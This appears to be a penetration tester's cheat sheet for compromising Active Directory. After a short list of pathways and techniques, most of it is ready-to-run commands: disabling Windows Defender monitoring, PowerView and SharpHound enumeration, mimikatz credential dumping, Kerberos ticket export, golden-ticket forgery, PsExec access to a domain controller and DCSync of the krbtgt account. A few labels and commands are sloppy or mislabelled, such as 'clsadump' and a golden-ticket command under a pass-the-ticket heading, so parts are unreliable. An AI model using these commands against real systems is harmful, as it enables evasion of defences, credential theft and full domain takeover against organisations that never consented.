## AD: General Pathways

A few of the many exploitation pathways:
 - Exploiting a web-app --> lateral movement throughout the network --> domain compromise
 - Exploiting a network/service vulnerability --> lateral movement throughout the network --> domain compromise
 - Exploiting a client-side attack to compromise a user --> later movement --> domain compromise

Methods:
 - Pass-The-Hash 
 - Pass-The-Ticket
 - Overpass-The-Hash
 - Kerberoasting
 - As-Rep Roasting
 - Golden Ticket
 - Silver Ticket
 - Password Spraying

## AD: Enumeration and Assessment

After gaining access to a machine within an AD network, it is essential to enumerate the environment and
understand the network, the domain, the machines within it, and where the compromised machine stands in relation
to the environment (permissions, groups, routes to admin, etc.).

Enumeration of AD can be done in various ways and many tools exist. Among them, some of the most popular and useful include sharphound/bloodhound, 
powerview, impacket, and of course, powershell.

### Powerview

Disable Monitoring
```
Set-MpPreference -DisableRealtimeMonitoring $true
```

Get Domain Info
```
Get-Domain
Get-DomainController
Get-Domain -Domain domain.local
Get-DomainController -Domain domain.local
Get-DomainUser
Get-DomainSID
Get-DomainPolicy
(Get-DomainPolicy)."SystemAccess"
Invoke-ShareFinder
Invoke-MapDomainTrust
```
---

### Using Bloodhound
File transfer --> download sharphound --> exfiltrate the data --> view data in bloodhound
--> identify valuable accounts or pathways within the domain --> use relevant tools to try to exploit those accounts
and move laterally

```powershell
.\sharphound.exe -c Default, GPOLocalGroup, LoggedOn --zipfilename output
```
---
Use mimikatz to find vulnerable accounts with weak passwords to be used for further exploitation:
```powershell
privilege::debug

sekurlsa::logonPasswords
 ```
---
## Pass the Ticket Example

Identify service principals:
 - Get-UserSPNs.ps1

Request ticket for vulnerable SPN (this can be done with mimikatz or via powershell):

powershell method:
```
Add-Type –AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken –ArgumentList ‘SPN'
```

mimikatz method:
After getting an SPN with domain controller access or access for lateral movement:
(example - SPN is mssqlserver)
```
kerberos::purge
kerberos::list
kerberos::ask /target:mssqlserver
kerberos::list /export
```

```powershell

kerberos::golden /user:admin /domain:corp.com /sid:S-1-5-21-xxx-xxxx-xxxxx /target:domain.com /service:MSSQLServer /rc4:hash /ptt


```

Accessing the DC with Admin privileges:

```
PsExec64.exe \\domain-dc01\ cmd.exe 
```
```
pushd \\domain-dc01\c$
cd \\domain-dc01\c$
```

```
lsaDump::dcsync /user:krbtgt

clsadump::lsa /inject /name:krbtgt

```
